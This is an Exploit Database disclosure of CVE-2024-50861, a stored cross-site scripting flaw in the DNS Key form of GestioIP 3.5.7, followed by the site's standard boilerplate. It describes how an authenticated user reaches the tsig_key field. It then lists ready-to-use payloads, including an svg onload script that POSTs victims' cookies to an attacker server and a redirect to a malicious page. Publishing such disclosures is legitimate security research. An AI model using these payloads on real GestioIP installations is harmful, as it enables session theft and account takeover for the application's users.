# Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Stored Cross-Site Scripting
# Exploit Author: m4xth0r (Maximiliano Belino)
# Author website: https://maxibelino.github.io/
# Author email: max.cybersecurity at belino.com
# GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50861
# Date: 2025-01-13
# Vendor Homepage: https://www.gestioip.net/
# Software Link: https://www.gestioip.net/en/download/
# Version: GestioIP v3.5.7
# Tested on: Kali Linux
# CVE: CVE-2024-50861

### Description

The http://localhost/gestioip/res/ip_mod_dns_key_form.cgi feature of GestioIP 3.5.7 is vulnerable to Stored XSS. An authenticated attacker with appropriate permissions can inject malicious code into the tsig_key form field and save it to the database. Once saved, any user who accesses the "DNS Key" page will trigger the Stored XSS, leading to the execution of malicious code.

### Prerequisites

1. Enable "DNS Key" Feature
First, ensure that "Dynamic DNS updates" is enabled in the global configuration:

Manage > Manage GestioIP > Global Configuration > Dynamic DNS updates enabled: yes

This will enable the following menus:

    Manage > DNS Keys
    Manage > DNS Update User

2. Create a DNS Key Entry

To create a new DNS key entry and also edit an existing one, the user must belong to a group with the "Manage Sites And Categories" permission. By default, "Admin" and "GestioIP Admin" groups have this permission.

Also, you can configure this permission to any group under:

Manage > User Groups > Manage Sites and Categories

3. Enter payload.

Once group permission is set, input one of the following payloads into the "TSIG Key" (tsig_key) field and save it.

### Payloads

1 - Test basic XSS

<script>alert("test")</script>

2 - Send data (cookies) to the attacker's server

<svg/onload="fetch('http://10.20.0.1:8000/steal_data',{method:'POST',body:document.cookie})">

3 - Redirect the user to a malicious site

<svg/onload="window.location='http://10.20.0.1:8090/malicious_page.html'">
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the ...
